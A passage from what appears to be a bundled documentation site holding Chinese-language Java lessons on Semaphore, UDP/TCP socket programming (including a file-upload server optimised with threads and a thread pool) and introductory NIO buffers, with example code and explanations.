\n\n​\t可以控制访问特定资源的线程数量。\n\n**实现步骤 :** \n\n​\t1，需要有人管理这个通道\n\n​\t2，当有车进来了，发通行许可证\n\n​\t3，当车出去了，收回通行许可证\n\n​\t4，如果通行许可证发完了，那么其他车辆只能等着\n\n**代码实现 :** \n\n```java\npackage com.itheima.mysemaphore;\n\nimport java.util.concurrent.Semaphore;\n\npublic class MyRunnable implements Runnable {\n    //1.获得管理员对象，\n    private Semaphore semaphore = new Semaphore(2);\n    @Override\n    public void run() {\n        //2.获得通行证\n        try {\n            semaphore.acquire();\n            //3.开始行驶\n            System.out.println("获得了通行证开始行驶");\n            Thread.sleep(2000);\n            System.out.println("归还通行证");\n            //4.归还通行证\n            semaphore.release();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n```\n\n```java\npackage com.itheima.mysemaphore;\n\npublic class MySemaphoreDemo {\n    public static void main(String[] args) {\n        MyRunnable mr = new MyRunnable();\n\n        for (int i = 0; i < 100; i++) {\n            new Thread(mr).start();\n        }\n    }\n}\n```\n\n\n\n',Hn={data:function(){return{MainComponent1:Nn,MainComponent2:qn}}},Bn=Hn,Fn=Object(u["a"])(Bn,Dn,Pn,!1,null,"9395efc6",null),Un=Fn.exports,Jn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}})],1)},zn=[],Wn='## 1.网络编程入门\n\n### 1.1 网络编程概述【理解】\n\n- 计算机网络\n\n  是指将地理位置不同的具有独立功能的多台计算机及其外部设备，通过通信线路连接起来，在网络操作系统，网络管理软件及网络通信协议的管理和协调下，实现资源共享和信息传递的计算机系统\n\n- 网络编程\n\n  在网络通信协议下，不同计算机上运行的程序，可以进行数据传输\n\n### 1.2 网络编程三要素【理解】\n\n- IP地址\n\n  要想让网络中的计算机能够互相通信，必须为每台计算机指定一个标识号，通过这个标识号来指定要接收数据的计算机和识别发送的计算机，而IP地址就是这个标识号。也就是设备的标识\n\n- 端口\n\n  网络的通信，本质上是两个应用程序的通信。每台计算机都有很多的应用程序，那么在网络通信时，如何区分这些应用程序呢？如果说IP地址可以唯一标识网络中的设备，那么端口号就可以唯一标识设备中的应用程序了。也就是应用程序的标识\n\n- 协议\n\n  通过计算机网络可以使多台计算机实现连接，位于同一个网络中的计算机在进行连接和通信时需要遵守一定的规则，这就好比在道路中行驶的汽车一定要遵守交通规则一样。在计算机网络中，这些连接和通信的规则被称为网络通信协议，它对数据的传输格式、传输速率、传输步骤等做了统一规定，通信双方必须同时遵守才能完成数据交换。常见的协议有UDP协议和TCP协议\n\n### 1.3 IP地址【理解】\n\nIP地址：是网络中设备的唯一标识\n\n- IP地址分为两大类\n\n  - IPv4：是给每个连接在网络上的主机分配一个32bit地址。按照TCP/IP规定，IP地址用二进制来表示，每个IP地址长32bit，也就是4个字节。例如一个采用二进制形式的IP地址是“11000000 10101000 00000001 01000010”，这么长的地址，处理起来也太费劲了。为了方便使用，IP地址经常被写成十进制的形式，中间使用符号“.”分隔不同的字节。于是，上面的IP地址可以表示为“192.168.1.66”。IP地址的这种表示法叫做“点分十进制表示法”，这显然比1和0容易记忆得多\n\n  - IPv6：由于互联网的蓬勃发展，IP地址的需求量愈来愈大，但是网络地址资源有限，使得IP的分配越发紧张。为了扩大地址空间，通过IPv6重新定义地址空间，采用128位地址长度，每16个字节一组，分成8组十六进制数，这样就解决了网络地址资源数量不够的问题\n\n- DOS常用命令：\n\n  - ipconfig：查看本机IP地址\n\n  - ping IP地址：检查网络是否连通\n\n- 特殊IP地址：\n  - 127.0.0.1：是回送地址，可以代表本机地址，一般用来测试使用\n\n### 1.4 InetAddress【应用】\n\nInetAddress：此类表示Internet协议（IP）地址\n\n- 相关方法\n\n  | 方法名                                      | 说明                               |\n  | ---------------------------------------- | -------------------------------- |\n  | static InetAddress getByName(String host) | 确定主机名称的IP地址。主机名称可以是机器名称，也可以是IP地址 |\n  | String getHostName()                     | 获取此IP地址的主机名                      |\n  | String getHostAddress()                  | 返回文本显示中的IP地址字符串                  |\n\n- 代码演示\n\n  ```java\n  public class InetAddressDemo {\n      public static void main(String[] args) throws UnknownHostException {\n  \t\t//InetAddress address = InetAddress.getByName("itheima");\n          InetAddress address = InetAddress.getByName("192.168.1.66");\n\n          //public String getHostName()：获取此IP地址的主机名\n          String name = address.getHostName();\n          //public String getHostAddress()：返回文本显示中的IP地址字符串\n          String ip = address.getHostAddress();\n\n          System.out.println("主机名：" + name);\n          System.out.println("IP地址：" + ip);\n      }\n  }\n  ```\n\n\n### 1.5 端口和协议【理解】\n\n- 端口\n\n  - 设备上应用程序的唯一标识\n\n- 端口号\n\n  - 用两个字节表示的整数，它的取值范围是0~65535。其中，0~1023之间的端口号用于一些知名的网络服务和应用，普通的应用程序需要使用1024以上的端口号。如果端口号被另外一个服务或应用所占用，会导致当前程序启动失败\n\n- 协议\n\n  - 计算机网络中，连接和通信的规则被称为网络通信协议\n\n- UDP协议\n  - 用户数据报协议(User Datagram Protocol)\n  - UDP是无连接通信协议，即在数据传输时，数据的发送端和接收端不建立逻辑连接。简单来说，当一台计算机向另外一台计算机发送数据时，发送端不会确认接收端是否存在，就会发出数据，同样接收端在收到数据时，也不会向发送端反馈是否收到数据。\n  - 由于使用UDP协议消耗系统资源小，通信效率高，所以通常都会用于音频、视频和普通数据的传输\n  - 例如视频会议通常采用UDP协议，因为这种情况即使偶尔丢失一两个数据包，也不会对接收结果产生太大影响。但是在使用UDP协议传送数据时，由于UDP的面向无连接性，不能保证数据的完整性，因此在传输重要数据时不建议使用UDP协议\n\n- TCP协议\n\n  - 传输控制协议 (Transmission Control Protocol)\n\n  - TCP协议是面向连接的通信协议，即传输数据之前，在发送端和接收端建立逻辑连接，然后再传输数据，它提供了两台计算机之间可靠无差错的数据传输。在TCP连接中必须要明确客户端与服务器端，由客户端向服务端发出连接请求，每次连接的创建都需要经过“三次握手”\n\n  - 三次握手：TCP协议中，在发送数据的准备阶段，客户端与服务器之间的三次交互，以保证连接的可靠\n\n    第一次握手，客户端向服务器端发出连接请求，等待服务器确认\n\n    第二次握手，服务器端向客户端回送一个响应，通知客户端收到了连接请求\n\n    第三次握手，客户端再次向服务器端发送确认信息，确认连接\n\n  - 完成三次握手，连接建立后，客户端和服务器就可以开始进行数据传输了。由于这种面向连接的特性，TCP协议可以保证传输数据的安全，所以应用十分广泛。例如上传文件、下载文件、浏览网页等\n\n## 2.UDP通信程序\n\n### 2.1 UDP发送数据【应用】\n\n- Java中的UDP通信\n  - UDP协议是一种不可靠的网络协议，它在通信的两端各建立一个Socket对象，但是这两个Socket只是发送，接收数据的对象，因此对于基于UDP协议的通信双方而言，没有所谓的客户端和服务器的概念\n  - Java提供了DatagramSocket类作为基于UDP协议的Socket\n\n- 构造方法\n\n  | 方法名                                      | 说明                           |\n  | ---------------------------------------- | ---------------------------- |\n  | DatagramSocket()                         | 创建数据报套接字并将其绑定到本机地址上的任何可用端口   |\n  | DatagramPacket(byte[] buf,int len,InetAddress add,int port) | 创建数据包,发送长度为len的数据包到指定主机的指定端口 |\n\n- 相关方法\n\n  | 方法名                            | 说明          |\n  | ------------------------------ | ----------- |\n  | void send(DatagramPacket p)    | 发送数据报包      |\n  | void close()                   | 关闭数据报套接字    |\n  | void receive(DatagramPacket p) | 从此套接字接受数据报包 |\n\n- 发送数据的步骤\n  - 创建发送端的Socket对象(DatagramSocket)\n  - 创建数据，并把数据打包\n  - 调用DatagramSocket对象的方法发送数据\n  - 关闭发送端\n\n- 代码演示\n\n  ```java\n  public class SendDemo {\n      public static void main(String[] args) throws IOException {\n          //创建发送端的Socket对象(DatagramSocket)\n          // DatagramSocket() 构造数据报套接字并将其绑定到本地主机上的任何可用端口\n          DatagramSocket ds = new DatagramSocket();\n\n          //创建数据，并把数据打包\n          //DatagramPacket(byte[] buf, int length, InetAddress address, int port)\n          //构造一个数据包，发送长度为 length的数据包到指定主机上的指定端口号。\n          byte[] bys = "hello,udp,我来了".getBytes();\n\n          DatagramPacket dp = new DatagramPacket(bys,bys.length,InetAddress.getByName("127.0.0.1"),10086);\n\n          //调用DatagramSocket对象的方法发送数据\n          //void send(DatagramPacket p) 从此套接字发送数据报包\n          ds.send(dp);\n\n          //关闭发送端\n          //void close() 关闭此数据报套接字\n          ds.close();\n      }\n  }\n  ```\n\n### 2.2UDP接收数据【应用】\n\n- 接收数据的步骤\n  - 创建接收端的Socket对象(DatagramSocket)\n  - 创建一个数据包，用于接收数据\n  - 调用DatagramSocket对象的方法接收数据\n  - 解析数据包，并把数据在控制台显示\n  - 关闭接收端\n\n- 构造方法\n\n  | 方法名                                 | 说明                               |\n  | ----------------------------------- | -------------------------------- |\n  | DatagramPacket(byte[] buf, int len) | 创建一个DatagramPacket用于接收长度为len的数据包 |\n\n- 相关方法\n\n  | 方法名               | 说明                   |\n  | ----------------- | -------------------- |\n  | byte[]  getData() | 返回数据缓冲区              |\n  | int  getLength()  | 返回要发送的数据的长度或接收的数据的长度 |\n\n- 示例代码\n\n  ```java\n  public class ReceiveDemo {\n      public static void main(String[] args) throws IOException {\n        \t//创建接收端的Socket对象(DatagramSocket)\n        \tDatagramSocket ds = new DatagramSocket(12345);\n\n        \t//创建一个数据包，用于接收数据\n        \tbyte[] bys = new byte[1024];\n        \tDatagramPacket dp = new DatagramPacket(bys, bys.length);\n\n        \t//调用DatagramSocket对象的方法接收数据\n        \tds.receive(dp);\n\n        \t//解析数据包，并把数据在控制台显示\n        \tSystem.out.println("数据是：" + new String(dp.getData(), 0,                                             dp.getLength()));\n          }\n      }\n  }\n  ```\n\n### 2.3UDP通信程序练习【应用】\n\n- 案例需求\n\n  UDP发送数据：数据来自于键盘录入，直到输入的数据是886，发送数据结束\n\n  UDP接收数据：因为接收端不知道发送端什么时候停止发送，故采用死循环接收\n\n- 代码实现\n\n  ```java\n  /*\n      UDP发送数据：\n          数据来自于键盘录入，直到输入的数据是886，发送数据结束\n   */\n  public class SendDemo {\n      public static void main(String[] args) throws IOException {\n          //创建发送端的Socket对象(DatagramSocket)\n          DatagramSocket ds = new DatagramSocket();\n          //键盘录入数据\n          Scanner sc = new Scanner(System.in);\n          while (true) {\n            \tString s = sc.nextLine();\n              //输入的数据是886，发送数据结束\n              if ("886".equals(s)) {\n                  break;\n              }\n              //创建数据，并把数据打包\n              byte[] bys = s.getBytes();\n              DatagramPacket dp = new DatagramPacket(bys, bys.length, InetAddress.getByName("192.168.1.66"), 12345);\n\n              //调用DatagramSocket对象的方法发送数据\n              ds.send(dp);\n          }\n          //关闭发送端\n          ds.close();\n      }\n  }\n\n  /*\n      UDP接收数据：\n          因为接收端不知道发送端什么时候停止发送，故采用死循环接收\n   */\n  public class ReceiveDemo {\n      public static void main(String[] args) throws IOException {\n          //创建接收端的Socket对象(DatagramSocket)\n          DatagramSocket ds = new DatagramSocket(12345);\n          while (true) {\n              //创建一个数据包，用于接收数据\n              byte[] bys = new byte[1024];\n              DatagramPacket dp = new DatagramPacket(bys, bys.length);\n              //调用DatagramSocket对象的方法接收数据\n              ds.receive(dp);\n              //解析数据包，并把数据在控制台显示\n              System.out.println("数据是：" + new String(dp.getData(), 0, dp.getLength()));\n          }\n          //关闭接收端\n  //        ds.close();\n      }\n  }\n  ```\n\n\n### 2.4UDP三种通讯方式【理解】\n\n+ 单播\n\n  单播用于两个主机之间的端对端通信\n\n+ 组播\n\n  组播用于对一组特定的主机进行通信\n\n+ 广播\n\n  广播用于一个主机对整个局域网上所有主机上的数据通信\n\n### 2.5UDP组播实现【理解】\n\n+ 实现步骤\n\n  + 发送端\n    1. 创建发送端的Socket对象(DatagramSocket)\n    2. 创建数据，并把数据打包(DatagramPacket)\n    3. 调用DatagramSocket对象的方法发送数据(在单播中,这里是发给指定IP的电脑但是在组播当中,这里是发给组播地址)\n    4. 释放资源\n  + 接收端\n    1. 创建接收端Socket对象(MulticastSocket)\n    2. 创建一个箱子,用于接收数据\n    3. 把当前计算机绑定一个组播地址\n    4. 将数据接收到箱子中\n    5. 解析数据包,并打印数据\n    6. 释放资源\n\n+ 代码实现\n\n  ```java\n  // 发送端\n  public class ClinetDemo {\n      public static void main(String[] args) throws IOException {\n          // 1. 创建发送端的Socket对象(DatagramSocket)\n          DatagramSocket ds = new DatagramSocket();\n          String s = "hello 组播";\n          byte[] bytes = s.getBytes();\n          InetAddress address = InetAddress.getByName("224.0.1.0");\n          int port = 10000;\n          // 2. 创建数据，并把数据打包(DatagramPacket)\n          DatagramPacket dp = new DatagramPacket(bytes,bytes.length,address,port);\n          // 3. 调用DatagramSocket对象的方法发送数据(在单播中,这里是发给指定IP的电脑但是在组播当中,这里是发给组播地址)\n          ds.send(dp);\n          // 4. 释放资源\n          ds.close();\n      }\n  }\n  // 接收端\n  public class ServerDemo {\n      public static void main(String[] args) throws IOException {\n          // 1. 创建接收端Socket对象(MulticastSocket)\n          MulticastSocket ms = new MulticastSocket(10000);\n          // 2. 创建一个箱子,用于接收数据\n          DatagramPacket dp = new DatagramPacket(new byte[1024],1024);\n          // 3. 把当前计算机绑定一个组播地址,表示添加到这一组中.\n          ms.joinGroup(InetAddress.getByName("224.0.1.0"));\n          // 4. 将数据接收到箱子中\n          ms.receive(dp);\n          // 5. 解析数据包,并打印数据\n          byte[] data = dp.getData();\n          int length = dp.getLength();\n          System.out.println(new String(data,0,length));\n          // 6. 释放资源\n          ms.close();\n      }\n  }\n  ```\n\n### 2.6UDP广播实现【理解】\n\n+ 实现步骤\n\n  + 发送端\n    1. 创建发送端Socket对象(DatagramSocket)\n    2. 创建存储数据的箱子,将广播地址封装进去\n    3. 发送数据\n    4. 释放资源\n  + 接收端\n    1. 创建接收端的Socket对象(DatagramSocket)\n    2. 创建一个数据包，用于接收数据\n    3. 调用DatagramSocket对象的方法接收数据\n    4. 解析数据包，并把数据在控制台显示\n    5. 关闭接收端\n\n+ 代码实现\n\n  ```java\n  // 发送端\n  public class ClientDemo {\n      public static void main(String[] args) throws IOException {\n        \t// 1. 创建发送端Socket对象(DatagramSocket)\n          DatagramSocket ds = new DatagramSocket();\n  \t\t// 2. 创建存储数据的箱子,将广播地址封装进去\n          String s = "广播 hello";\n          byte[] bytes = s.getBytes();\n          InetAddress address = InetAddress.getByName("255.255.255.255");\n          int port = 10000;\n          DatagramPacket dp = new DatagramPacket(bytes,bytes.length,address,port);\n  \t\t// 3. 发送数据\n          ds.send(dp);\n  \t\t// 4. 释放资源\n          ds.close();\n      }\n  }\n  // 接收端\n  public class ServerDemo {\n      public static void main(String[] args) throws IOException {\n          // 1. 创建接收端的Socket对象(DatagramSocket)\n          DatagramSocket ds = new DatagramSocket(10000);\n          // 2. 创建一个数据包，用于接收数据\n          DatagramPacket dp = new DatagramPacket(new byte[1024],1024);\n          // 3. 调用DatagramSocket对象的方法接收数据\n          ds.receive(dp);\n          // 4. 解析数据包，并把数据在控制台显示\n          byte[] data = dp.getData();\n          int length = dp.getLength();\n          System.out.println(new String(data,0,length));\n          // 5. 关闭接收端\n          ds.close();\n      }\n  }\n  ```\n\n\n## 3.TCP通信程序\n\n### 3.1TCP发送数据【应用】\n\n- Java中的TCP通信\n\n  - Java对基于TCP协议的的网络提供了良好的封装，使用Socket对象来代表两端的通信端口，并通过Socket产生IO流来进行网络通信。\n  - Java为客户端提供了Socket类，为服务器端提供了ServerSocket类\n\n- 构造方法\n\n  | 方法名                                  | 说明                      |\n  | ------------------------------------ | ----------------------- |\n  | Socket(InetAddress address,int port) | 创建流套接字并将其连接到指定IP指定端口号   |\n  | Socket(String host, int port)        | 创建流套接字并将其连接到指定主机上的指定端口号 |\n\n- 相关方法\n\n  | 方法名                            | 说明         |\n  | ------------------------------ | ---------- |\n  | InputStream  getInputStream()  | 返回此套接字的输入流 |\n  | OutputStream getOutputStream() | 返回此套接字的输出流 |\n\n- 示例代码\n\n  ```java\n  public class ClientDemo {\n      public static void main(String[] args) throws IOException {\n          //创建客户端的Socket对象(Socket)\n          //Socket(String host, int port) 创建流套接字并将其连接到指定主机上的指定端口号\n          Socket s = new Socket("127.0.0.1",10000);\n\n          //获取输出流，写数据\n          //OutputStream getOutputStream() 返回此套接字的输出流\n          OutputStream os = s.getOutputStream();\n          os.write("hello,tcp,我来了".getBytes());\n\n          //释放资源\n          s.close();\n      }\n  }\n  ```\n\n### 3.2TCP接收数据【应用】\n\n- 构造方法\n\n  | 方法名                     | 说明               |\n  | ----------------------- | ---------------- |\n  | ServletSocket(int port) | 创建绑定到指定端口的服务器套接字 |\n\n- 相关方法\n\n  | 方法名             | 说明              |\n  | --------------- | --------------- |\n  | Socket accept() | 监听要连接到此的套接字并接受它 |\n\n- 注意事项\n\n  1. accept方法是阻塞的,作用就是等待客户端连接\n  2. 客户端创建对象并连接服务器,此时是通过三次握手协议,保证跟服务器之间的连接\n  3. 针对客户端来讲,是往外写的,所以是输出流\n     针对服务器来讲,是往里读的,所以是输入流\n  4. read方法也是阻塞的\n  5. 客户端在关流的时候,还多了一个往服务器写结束标记的动作\n  6. 最后一步断开连接,通过四次挥手协议保证连接终止\n\n- 三次握手和四次挥手\n\n  - 三次握手\n\n    ![07_TCP三次握手](./img/java/basics/day23-网络编程01.img/07_TCP三次握手.png)\n\n  - 四次挥手\n\n    ![08_TCP四次挥手](./img/java/basics/day23-网络编程01.img/08_TCP四次挥手.png)\n\n\n- 示例代码\n\n  ```java\n  public class ServerDemo {\n      public static void main(String[] args) throws IOException {\n          //创建服务器端的Socket对象(ServerSocket)\n          //ServerSocket(int port) 创建绑定到指定端口的服务器套接字\n          ServerSocket ss = new ServerSocket(10000);\n\n          //Socket accept() 侦听要连接到此套接字并接受它\n          Socket s = ss.accept();\n\n          //获取输入流，读数据，并把数据显示在控制台\n          InputStream is = s.getInputStream();\n          byte[] bys = new byte[1024];\n          int len = is.read(bys);\n          String data = new String(bys,0,len);\n          System.out.println("数据是：" + data);\n\n          //释放资源\n          s.close();\n          ss.close();\n      }\n  }\n  ```\n\n### 3.3TCP程序练习【应用】\n\n- 案例需求\n\n  客户端：发送数据，接受服务器反馈\n\n  服务器：收到消息后给出反馈\n\n- 案例分析\n  - 客户端创建对象，使用输出流输出数据\n  - 服务端创建对象，使用输入流接受数据\n  - 服务端使用输出流给出反馈数据\n  - 客户端使用输入流接受反馈数据\n\n- 代码实现\n\n  ```java\n  // 客户端\n  public class ClientDemo {\n      public static void main(String[] args) throws IOException {\n          Socket socket = new Socket("127.0.0.1",10000);\n\n          OutputStream os = socket.getOutputStream();\n          os.write("hello".getBytes());\n         // os.close();如果在这里关流,会导致整个socket都无法使用\n          socket.shutdownOutput();//仅仅关闭输出流.并写一个结束标记,对socket没有任何影响\n          \n          BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n          String line;\n          while((line = br.readLine())!=null){\n              System.out.println(line);\n          }\n          br.close();\n          os.close();\n          socket.close();\n      }\n  }\n  // 服务器\n  public class ServerDemo {\n      public static void main(String[] args) throws IOException {\n          ServerSocket ss = new ServerSocket(10000);\n\n          Socket accept = ss.accept();\n\n          InputStream is = accept.getInputStream();\n          int b;\n          while((b = is.read())!=-1){\n              System.out.println((char) b);\n          }\n\n          System.out.println("看看我执行了吗?");\n\n          BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(accept.getOutputStream()));\n          bw.write("你谁啊?");\n          bw.newLine();\n          bw.flush();\n\n          bw.close();\n          is.close();\n          accept.close();\n          ss.close();\n      }\n  }\n  ```\n\n### 3.4TCP程序文件上传练习【应用】\n\n- 案例需求\n\n  客户端：数据来自于本地文件，接收服务器反馈\n\n  服务器：接收到的数据写入本地文件，给出反馈\n\n- 案例分析\n  - 创建客户端对象，创建输入流对象指向文件，每读一次数据就给服务器输出一次数据，输出结束后使用shutdownOutput()方法告知服务端传输结束\n  - 创建服务器对象，创建输出流对象指向文件，每接受一次数据就使用输出流输出到文件中，传输结束后。使用输出流给客户端反馈信息\n  - 客户端接受服务端的回馈信息\n\n- 相关方法\n\n  | 方法名                   | 说明                 |\n  | --------------------- | ------------------ |\n  | void shutdownInput()  | 将此套接字的输入流放置在“流的末尾” |\n  | void shutdownOutput() | 禁止用此套接字的输出流        |\n\n- 代码实现\n\n  ```java\n  // 客户端\n  public class ClientDemo {\n      public static void main(String[] args) throws IOException {\n          Socket socket = new Socket("127.0.0.1",10000);\n\n          //是本地的流,用来读取本地文件的.\n          BufferedInputStream bis = new BufferedInputStream(new FileInputStream("socketmodule\\\\ClientDir\\\\1.jpg"));\n\n          //写到服务器 --- 网络中的流\n          OutputStream os = socket.getOutputStream();\n          BufferedOutputStream bos = new BufferedOutputStream(os);\n\n          int b;\n          while((b = bis.read())!=-1){\n              bos.write(b);//通过网络写到服务器中\n          }\n          bos.flush();\n          //给服务器一个结束标记,告诉服务器文件已经传输完毕\n          socket.shutdownOutput();\n\n          BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n          String line;\n          while((line = br.readLine()) !=null){\n              System.out.println(line);\n          }\n          bis.close();\n          socket.close();\n      }\n  }\n  // 服务器\n  public class ServerDemo {\n      public static void main(String[] args) throws IOException {\n          ServerSocket ss = new ServerSocket(10000);\n\n          Socket accept = ss.accept();\n\n          //网络中的流,从客户端读取数据的\n          BufferedInputStream bis = new BufferedInputStream(accept.getInputStream());\n          //本地的IO流,把数据写到本地中,实现永久化存储\n          BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("socketmodule\\\\ServerDir\\\\copy.jpg"));\n\n          int b;\n          while((b = bis.read()) !=-1){\n              bos.write(b);\n          }\n\n          BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(accept.getOutputStream()));\n          bw.write("上传成功");\n          bw.newLine();\n          bw.flush();\n\n          bos.close();\n          accept.close();\n          ss.close();\n      }\n  }\n  ```\n\n### 3.5TCP程序服务器优化【应用】\n\n- 优化方案一\n\n  + 需求\n\n    服务器只能处理一个客户端请求，接收完一个图片之后，服务器就关闭了。\n\n  + 解决方案\n\n    使用循环\n\n  + 代码实现\n\n    ```java\n    // 服务器代码如下,客户端代码同上个案例,此处不再给出\n    public class ServerDemo {\n        public static void main(String[] args) throws IOException {\n            ServerSocket ss = new ServerSocket(10000);\n\n            while (true) {\n                Socket accept = ss.accept();\n\n                //网络中的流,从客户端读取数据的\n                BufferedInputStream bis = new BufferedInputStream(accept.getInputStream());\n                //本地的IO流,把数据写到本地中,实现永久化存储\n                BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("optimizeserver\\\\ServerDir\\\\copy.jpg"));\n\n                int b;\n                while((b = bis.read()) !=-1){\n                    bos.write(b);\n                }\n\n                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(accept.getOutputStream()));\n                bw.write("上传成功");\n                bw.newLine();\n                bw.flush();\n\n                bos.close();\n                accept.close();\n            }\n            //ss.close();\n            \n        }\n    }\n    ```\n\n- 优化方案二\n\n  + 需求\n\n    第二次上传文件的时候，会把第一次的文件给覆盖。\n\n  + 解决方案\n\n    UUID. randomUUID()方法生成随机的文件名\n\n  + 代码实现\n\n    ```java\n    // 服务器代码如下,客户端代码同上个案例,此处不再给出\n    public class ServerDemo {\n        public static void main(String[] args) throws IOException {\n            ServerSocket ss = new ServerSocket(10000);\n\n            while (true) {\n                Socket accept = ss.accept();\n\n                //网络中的流,从客户端读取数据的\n                BufferedInputStream bis = new BufferedInputStream(accept.getInputStream());\n                //本地的IO流,把数据写到本地中,实现永久化存储\n                BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream("optimizeserver\\\\ServerDir\\\\" + UUID.randomUUID().toString() + ".jpg"));\n\n                int b;\n                while((b = bis.read()) !=-1){\n                    bos.write(b);\n                }\n\n                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(accept.getOutputStream()));\n                bw.write("上传成功");\n                bw.newLine();\n                bw.flush();\n\n                bos.close();\n                accept.close();\n            }\n            //ss.close();\n\n        }\n    }\n    ```\n\n- 优化方案三\n\n  - 需求\n\n    使用循环虽然可以让服务器处理多个客户端请求。但是还是无法同时跟多个客户端进行通信。\n\n  - 解决方案\n\n    开启多线程处理\n\n  - 代码实现\n\n    ```java\n    // 线程任务类\n    public class ThreadSocket implements Runnable {\n        private Socket acceptSocket;\n\n        public ThreadSocket(Socket accept) {\n            this.acceptSocket = accept;\n        }\n      \n        @Override\n        public void run() {\n            BufferedOutputStream bos = null;\n            try {\n                //网络中的流,从客户端读取数据的\n                BufferedInputStream bis = new BufferedInputStream(acceptSocket.getInputStream());\n                //本地的IO流,把数据写到本地中,实现永久化存储\n                bos = new BufferedOutputStream(new FileOutputStream("optimizeserver\\\\ServerDir\\\\" + UUID.randomUUID().toString() + ".jpg"));\n\n                int b;\n                while((b = bis.read()) !=-1){\n                    bos.write(b);\n                }\n              \n                BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(acceptSocket.getOutputStream()));\n                bw.write("上传成功");\n                bw.newLine();\n                bw.flush();\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                if(bos != null){\n                    try {\n                        bos.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n\n                if (acceptSocket != null){\n                    try {\n                        acceptSocket.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n    // 服务器代码\n    public class ServerDemo {\n        public static void main(String[] args) throws IOException {\n            ServerSocket ss = new ServerSocket(10000);\n\n            while (true) {\n                Socket accept = ss.accept();\n                ThreadSocket ts = new ThreadSocket(accept);\n                new Thread(ts).start();\n            }\n            //ss.close();\n        }\n    }\n    ```\n\n- 优化方案四\n\n  - 需求\n\n    使用多线程虽然可以让服务器同时处理多个客户端请求。但是资源消耗太大。\n\n  - 解决方案\n\n    加入线程池\n\n  - 代码实现\n\n    ```java\n    // 服务器代码如下,线程任务类代码同上,此处不再给出\n    public class ServerDemo {\n        public static void main(String[] args) throws IOException {\n            ServerSocket ss = new ServerSocket(10000);\n            ThreadPoolExecutor pool = new ThreadPoolExecutor(\n                    3,//核心线程数量\n                    10,   //线程池的总数量\n                    60,   //临时线程空闲时间\n                    TimeUnit.SECONDS, //临时线程空闲时间的单位\n                    new ArrayBlockingQueue<>(5),//阻塞队列\n                    Executors.defaultThreadFactory(),//创建线程的方式\n                    new ThreadPoolExecutor.AbortPolicy()//任务拒绝策略\n            );\n\n            while (true) {\n                Socket accept = ss.accept();\n                ThreadSocket ts = new ThreadSocket(accept);\n                //new Thread(ts).start();\n                pool.submit(ts);\n            }\n            //ss.close();\n        }\n    }\n    ```\n\n\n## 4.NIO\n\n### 4.1概述【理解】\n\n+ BIO\n\n  Blocking IO,阻塞型IO\n\n+ NIO\n\n  No Blocking IO,非阻塞型IO\n\n+ 阻塞IO的弊端\n\n  在等待的过程中,什么事也做不了\n\n+ 非阻塞IO的好处\n\n  不需要一直等待,当一切就绪了再去做\n\n### 4.2NIO与BIO的区别【理解】\n\n+ 区别一\n\n  BIO是阻塞的，NIO是非阻塞的\n\n+ 区别二\n\n  BIO是面向流的，NIO是面向缓冲区的\n\n  BIO中数据传输是单向的，NIO中的缓冲区是双向的\n\n### 4.3NIO三大模块【理解】\n\n+ 缓冲区\n\n  用来存储数据\n\n+ 通道\n\n  用来建立连接和传输数据\n\n+ 选择器\n\n  监视通道状态\n\n  ![09_三大模块](./img/java/basics/day23-网络编程01.img/09_三大模块.png)\n\n### 4.4NIO创建缓冲区对象【应用】\n\n+ 方法介绍\n\n  | 方法名                                    | 说明                |\n  | -------------------------------------- | ----------------- |\n  | static  ByteBuffer  allocate(长度)       | 创建byte类型的缓冲区      |\n  | static  ByteBuffer  wrap(byte[] array) | 创建一个有内容的byte类型缓冲区 |\n\n+ 代码示例\n\n  ```java\n  public class CreateByteBufferDemo1 {\n      public static void main(String[] args) {\n          //method1();\n\n          //method2();\n\n          ByteBuffer wrap = ByteBuffer.wrap("aaa".getBytes());\n          for (int i = 0; i < 3; i++) {\n              System.out.println(wrap.get());\n          }\n      }\n\n      private static void method2() {\n          byte [] bytes = {97,98,99};\n          ByteBuffer byteBuffer2 = ByteBuffer.wrap(bytes);\n          //缓冲区的长度3\n          //缓冲区里面的内容就是字节数组的内容.\n          for (int i = 0; i < 3; i++) {\n              System.out.println(byteBuffer2.get());\n          }\n          System.out.println(byteBuffer2.get());\n      }\n\n      private static void method1() {\n          ByteBuffer byteBuffer1 = ByteBuffer.allocate(5);\n          //get\n          for (int i = 0; i < 5; i++) {\n              System.out.println(byteBuffer1.get());\n          }\n          System.out.println(byteBuffer1.get());\n      }\n  }\n  ```\n\n### 4.5NIO缓冲区添加数据【应用】\n\n+ 方法介绍\n\n  ![10_NIO缓冲区添加数据](./img/java/basics/day23-网络编程01.img/10_NIO缓冲区添加数据.png)\n\n+ 代码示例\n\n  ```java\n  public class ByteBufferDemo2 {\n      public static void main(String[] args) {\n  //        int position()\t\t  当前要操作的索引\n  //        int limit() \t\t  最多能操作到哪个索引\n  //        int capacity()\t\t  缓冲区的总长度\n          ByteBuffer byteBuffer = ByteBuffer.allocate(10);\n          System.out.println(byteBuffer.position());//0\n          System.out.println(byteBuffer.limit());//10\n          System.out.println(byteBuffer.capacity());//10\n\n  //        put(byte b)\t\t  一次添加一个字节\n  //        byteBuffer.put((byte) 97);\n  //        System.out.println(byteBuffer.position());\n  //        System.out.println(byteBuffer.limit());\n  //        System.out.println(byteBuffer.capacity());\n\n  //        put(byte[] src)\t\t 一次添加一个字节数组\n  //        byteBuffer.put("aaa".getBytes());\n  //        System.out.println(byteBuffer.position());//3\n  //        System.out.println(byteBuffer.limit());//10\n  //        System.out.println(byteBuffer.capacity());//10\n\n  //        position(int newPosition) 修改position\n  //        